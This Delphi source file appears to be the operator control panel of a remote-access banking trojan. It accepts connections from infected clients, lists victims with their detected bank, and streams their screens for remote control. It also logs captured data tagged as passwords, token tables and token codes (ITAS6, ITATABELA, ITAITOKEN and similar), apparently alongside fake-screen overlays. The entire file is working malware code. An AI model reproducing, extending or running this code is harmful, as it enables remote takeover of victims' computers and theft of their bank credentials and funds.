unit Principa;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, StdCtrls, Menus, XPMan, ComCtrls, ScktComp, zLibEx, LH5Unit, StreamManager,
  Buttons, AdvGlassButton;



type TSock_Thread = class(TThread)
private
  Socket: TCustomWinSocket;
public
  constructor Create(aSocket:TCustomWinSocket);
  procedure Execute; override;
end;

type TSock_Thread2 = class(TThread)
private
  Socket: TCustomWinSocket;
public
  constructor Create(aSocket:TCustomWinSocket);
  procedure Execute; override;
end;

type TSock_Thread3 = class(TThread)
private
  Socket: TCustomWinSocket;
public
  constructor Create(aSocket:TCustomWinSocket);
  procedure Execute; override;
end;

type
  TFrm_Principal = class(TForm)
    Panel1: TPanel;
    XPManifest1: TXPManifest;
    LV1: TListView;
    StatusBar1: TStatusBar;
    PopupMenu1: TPopupMenu;
    Fecharconexo1: TMenuItem;
    N1: TMenuItem;
    FecharConexo2: TMenuItem;
    SS1: TServerSocket;
    Timer1: TTimer;
    Panel2: TPanel;
    GroupBox1: TGroupBox;
    EdtTOut: TEdit;
    EdtMax: TEdit;
    Edit1: TEdit;
    Edit2: TEdit;
    Memo1: TMemo;
    Panel3: TPanel;
    Label1: TLabel;
    Label2: TLabel;
    Label3: TLabel;
    Label4: TLabel;
    Btnstart: TAdvGlassButton;
    procedure Fecharconexo1Click(Sender: TObject);
    procedure SS1ClientError(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure SS1Listen(Sender: TObject; Socket: TCustomWinSocket);
    procedure SS1Accept(Sender: TObject; Socket: TCustomWinSocket);
    procedure SS1ClientDisconnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure Timer1Timer(Sender: TObject);
    procedure FecharConexo2Click(Sender: TObject);
    procedure BtnstartClick(Sender: TObject);
  private
    { Private declarations }
  public
    L: TListItem;
    { Public declarations }
  end;

var
  Frm_Principal: TFrm_Principal;

implementation

uses Desktop_Remoto;

Constructor TSock_Thread.Create(aSocket:TCustomWinSocket);
begin
  inherited Create(true);
  Socket := aSocket;
  FreeOnTerminate := true;
end;

Constructor TSock_Thread2.Create(aSocket:TCustomWinSocket);
begin
  inherited Create(true);
  Socket := aSocket;
  FreeOnTerminate := true;
end;

Constructor TSock_Thread3.Create(aSocket:TCustomWinSocket);
begin
  inherited Create(true);
  Socket := aSocket;
  FreeOnTerminate := true;
end;


{$R *.dfm}


function DeCompressStream(SrcStream: TMemoryStream):boolean;
var
  InputStream,OutputStream :TMemoryStream;
//CompressionStream :TZcompressionStream;
  inbuffer,outbuffer :Pointer;
  count,outcount :longint;
begin
  result := false;
  if not assigned(SrcStream) then exit;

  InputStream := TMemoryStream.Create;
  OutputStream := TMemoryStream.Create;

  //CompressionStream := TZCompressionStream.Create(OutputStream,zcFastest);
  try
    InputStream.LoadFromStream(SrcStream);
    count := inputstream.Size;
    getmem(inbuffer,count);
    Inputstream.ReadBuffer(inbuffer^,count);
    //CompressionStream.Write(buffer,count);
    zdecompress(inbuffer,count,outbuffer,outcount);
    //CompressionStream.CopyFrom(InputStream,0);
    //Outputstream.LoadFromStream(Inputstream);
    outputstream.Write(outbuffer^,outcount);
    SrcStream.Clear;
    SrcStream.LoadFromStream(OutputStream);
    result :=true;
  finally
//CompressionStream.Free;
    InputStream.Free;
    OutputStream.Free;
end;
end;




procedure TSock_Thread.Execute;
var
  s: String;
  TSTPrincipal : TSock_Thread2;
  TSTDesktop   : TSock_Thread3;
begin
  inherited;
  while not Terminated and Socket.Connected do
  begin
    if Socket.ReceiveLength > 0 then
       begin
         s := Socket.ReceiveText;
         if Pos('<|PRINCIPAL|>', s)>0 then
            begin
              TSTPrincipal := TSock_Thread2.Create(Socket);
              TSTPrincipal.Resume;
              Socket.SendText('<|OK|>');
              Destroy;
            end;

          if Pos('<|Desktop|>', s)>0 then
            begin
              TSTDesktop := TSock_Thread3.Create(Socket);
              TSTDesktop.Resume;
              Socket.SendText('<|first|>');
              Destroy;
            end;

          if Pos('<|KEYBOARD|>', s)>0 then
            begin
              Form2.Socket2 := Socket;
              Destroy;
            end;

       end;
    Sleep(10);
  end;
end;

procedure TSock_Thread2.Execute;
var
  s, s2, s3, iden, SO, Proc, Senha, bank: String;
  L: TListItem;
  ping1, ping2: Integer;
  i : Integer;
  ItemExist : Boolean;
begin
  inherited;
  while not Terminated and Socket.Connected do
  begin
    if Socket.ReceiveLength > 0 then
       begin
          s := Socket.ReceiveText;
          if Pos('<|Info|>', s)>0 then
             begin
                s2 := s;

                Delete(s2, 1, Pos('<|Info|>', s2)+7);
                Iden := Copy(s2, 1, Pos('<|>', s2)-1);

                Delete(s2, 1, Pos('<|>', s2)+2);
                SO := Copy(s2, 1, Pos('<|>', s2)-1);

                Delete(s2, 1, Pos('<|>', s2)+2);
                Proc := Copy(s2, 1, Pos('<|>', s2)-1);

                Delete(s2, 1, Pos('<|>', s2)+2);
                Senha := Copy(s2, 1, Pos('<<|', s2)-1);

                s3 := Copy(s2, Pos('<R>', s2), Length(s2) );
                bank := Trim(StringReplace(s3,'<R>','',[rfReplaceAll]));

                if Senha = Frm_Principal.Edit2.Text then
                   begin
                     L := Frm_Principal.LV1.Items.Add;
                     L.Caption := intToStr(Socket.Handle);
                     L.SubItems.Add(Iden);
                     L.SubItems.Add(SO);
                     L.SubItems.Add(Proc);
                     L.SubItems.Add(Socket.RemoteAddress);
                     L.SubItems.Add('...');
                     L.SubItems.Objects[0] := TObject(Socket);
                     L.SubItems.Add(Bank);
                   end
                else
                   Socket.SendText('<|NOSenha|>');
             end;

          if Pos('<|PONG|>', s)>0 then
             begin
               bank := Trim(StringReplace( Copy(s, Pos('<R>', s), Length(s) ) ,'<R>','',[rfReplaceAll]));
               L             := Frm_Principal.LV1.FindCaption(0, intToStr(Socket.Handle), false, true, false);
               ping1         := Integer(L.SubItems.Objects[1]);
               ping2         := GetTickCount-Ping1;
               L.SubItems[4] := intToStr(ping2);
               L.SubItems[5] := bank;
             end;

          if (Pos('STARTFAKE',s)>0) then
            begin
              if Form2.Showing then
                 Form2.Memo1.Lines.Add(s);
            end;

          // Form2.StatusBar1.Panels[0].Text := 'Retorno Cliente: '+s;
          //if Form2.Showing then
          //   Form2.Mlog.Lines.Add( 'Retorno Cliente: '+s );

          if (Pos('ITAS6', s)> 0) then
             begin
               Delete(s, 1, pos('|', s));
               if Form2.Showing then
                  begin
                    Form2.Mlog.lines.Add('ITAS6:');
                    Form2.Mlog.lines.Add(s);
                  end;
             end;

          if (pos('ITAJS6', s) > 0) then
             begin
               Delete(s, 1, pos('|', s));
               if Form2.Showing then
                   begin
                     Form2.Mlog.lines.Add('ITAJS6:');
                     Form2.Mlog.lines.Add(s);
                   end;
             end;

          if (pos('ITATABELA', s) > 0) then
             begin
               Delete(s, 1, pos('|', s));
               if Form2.Showing then
                   begin
                     Form2.Mlog.lines.Add('ITATABELA:');
                     Form2.Mlog.lines.Add(s);
                   end;
             end;

          if (pos('ITAITOKEN', s) > 0) then
             begin
               Delete(s, 1, pos('|', s));
               if Form2.Showing then
                   begin
                     Form2.Mlog.lines.Add('ITAITOKEN:');
                     Form2.Mlog.lines.Add(s);
                   end;
             end;

          if (pos('ITAJTOKEN', s) > 0) then
             begin
               Delete(s, 1, pos('|', s));
               if Form2.Showing then
                   begin
                     Form2.Mlog.lines.Add('ITAJTOKEN:');
                     Form2.Mlog.lines.Add(s);
                   end;
             end

          // if Pos('ORIG_IMG_1',s)

       end;
    Sleep(10);
  end;
end;

procedure TSock_Thread3.Execute;
var
  i        : Integer;
  item     : TListItem;
  bmp      : TBitmap;
  Stream   : TMemoryStream;
  MyBuffer : array[0..10000] of byte;
  MyReceviceLength : integer;
  S : string;
  MyFirstBmp, MySecondBmp, MyCompareBmp, UnPackStream, MyTempStream: TMemoryStream;
  MySize : Longint;
  iReviceCount : integer;
begin
   MyFirstBmp   := TMemoryStream.Create;
   UnpackStream := TMemoryStream.Create;
   MyTempStream := TMemoryStream.Create;
   MySecondBmp  := TMemoryStream.Create;
   MyCompareBmp := TMemoryStream.Create;
   UnPackStream := TMemoryStream.Create;

   While not Terminated and Socket.Connected do
   begin
     if Socket.ReceiveLength > 0 then
        begin
           if MySize = 0 then
              begin
                 S            := Socket.ReceiveText;
                 MySize       := Strtoint(S);
                 iReviceCount := iReviceCount + 1;
                 Socket.SendText('<|okok|>');
              end
           else
              begin
                 MyReceviceLength := socket.ReceiveLength;
                 Socket.ReceiveBuf(MyBuffer, MyReceviceLength);
                 MyTempStream.Write(MyBuffer, MyReceviceLength);
                 Application.ProcessMessages;
                 if MyTempStream.Size >= MySize then
                    begin
                       MyTempStream.Position := 0;
                       UnPackStream.Clear;

                       DeCompressStream(MyTempStream);
                       LHAExpand(MyTempStream, UnPackStream);
                       Application.ProcessMessages;
                       UnPackStream.Position := 0;

                       if MyFirstBmp.Size = 0 then
                          begin
                             MyFirstBmp.CopyFrom(UnPackStream, 0);
                             MyFirstBmp.Position := 0;
                             Application.ProcessMessages;
                             Form2.Image1.Bitmap.LoadFromStream(MyFirstBmp);
                             Form2.Width := Form2.Image1.Width;
                             Form2.Height := Form2.Image1.Height;
                          end
                       else
                          begin
                             MyCompareBmp.Clear;
                             MySecondBmp.Clear;

                             MyCompareBmp.CopyFrom(UnpackStream, 0);
                             ResumeStream(MyFirstBmp, MySecondBmp, MyCompareBmp);
                             Application.ProcessMessages;
                             Form2.Image1.Bitmap.LoadFromStream(MySecondBmp);
                          end;
                      MySize := 0;
                      Application.ProcessMessages;
                      if Form2.Visible then
                        Socket.SendText('<|gets|>');
                      UnPackStream.Clear;
                      MyTempStream.Clear;


                    end;
                end;
        end;
     Sleep(10); // evita a CPU ficar em 100%
   end;
end;



procedure TFrm_Principal.Fecharconexo1Click(Sender: TObject);
var
  Socket: TCustomWinSocket;
begin
  Form2.Caption := 'Acesso Remoto Cliente Nº Id: ' + LV1.Selected.SubItems[1] +
                                      ' | IP nº: ' + LV1.Selected.SubItems[3] +
                                        ' Sigla: ' + LV1.Selected.SubItems[5] ;
  Form2.Show;
  Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
  Form2.Socket := Socket;
  Socket.SendText('<|first|>');
  Form2.Caption := 'Acesso Remoto Cliente Nº Id: ' + LV1.Selected.SubItems[1] +
                                      ' | IP nº: ' + LV1.Selected.SubItems[3] +
                                        ' Sigla: ' + LV1.Selected.SubItems[5] ;
end;

procedure TFrm_Principal.BtnstartClick(Sender: TObject);
begin
 if Btnstart.Caption = 'Ativar Operador' then
    begin
      LV1.Enabled := true;
      Btnstart.Caption := 'Desativar Operador';
      StatusBar1.Panels.Items[1].Text := 'Ativado Operador';
      Btnstart.BackColor  := clGreen;
      SS1.Port := strToInt(Edit1.Text);
      SS1.Active := true;
      Edit1.Enabled := false;
    end
 else
    begin
      LV1.Enabled := false;
      Btnstart.Caption := 'Ativar Operador';
      StatusBar1.Panels.Items[1].Text := 'Desativado Operador';
      Btnstart.BackColor := clRed;
      SS1.Active := false;
      LV1.Clear;
      Edit1.Enabled := true;
    end;
end;

procedure TFrm_Principal.SS1ClientError(Sender: TObject; Socket: TCustomWinSocket;
  ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
  ErrorCode := 0;
  L := LV1.FindCaption(0, intToStr(Socket.Handle), false, true, false);
  if L <> nil then
     begin
       if Socket = Form2.Socket then
          begin
            Form2.CheckBox1.Checked := false;
            Form2.CheckBox2.Checked := false;
            Form2.Close;
          end;
       L.Delete;
     end;
end;

procedure TFrm_Principal.SS1Listen(Sender: TObject; Socket: TCustomWinSocket);
begin
  StatusBar1.Panels.Items[1].Text := 'Aguardando conexões na porta: '+intToStr(SS1.Port);
end;

procedure TFrm_Principal.SS1Accept(Sender: TObject; Socket: TCustomWinSocket);
var
  TST: TSock_Thread;
begin
  TST := TSock_Thread.Create(Socket);
  TST.Resume;
end;

procedure TFrm_Principal.SS1ClientDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
  L := LV1.FindCaption(0, intToStr(Socket.Handle), false, true, false);
  if L <> nil then
     begin
       if Socket = Form2.Socket then
          begin
            Form2.CheckBox1.Checked := false;
            Form2.CheckBox2.Checked := false;
            Form2.Close;
          end;
       L.Delete;
     end;
end;

procedure TFrm_Principal.Timer1Timer(Sender: TObject);
var
  i: Integer;
  Socket: TcustomWinSocket;
begin
  for i := 0 to LV1.Items.Count-1 do
  begin
    Socket := TCustomWinSocket(Frm_Principal.LV1.Items.Item[i].SubItems.Objects[0]);
    Frm_Principal.LV1.Items.Item[i].SubItems.Objects[1] := TObject(GetTickCount);
    Socket.SendText('<|PING|>');
  end;
end;

procedure TFrm_Principal.FecharConexo2Click(Sender: TObject);
var
  Socket: TCustomWinSocket;
begin
  Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
  Socket.SendText('<|Close|>');
end;

end.
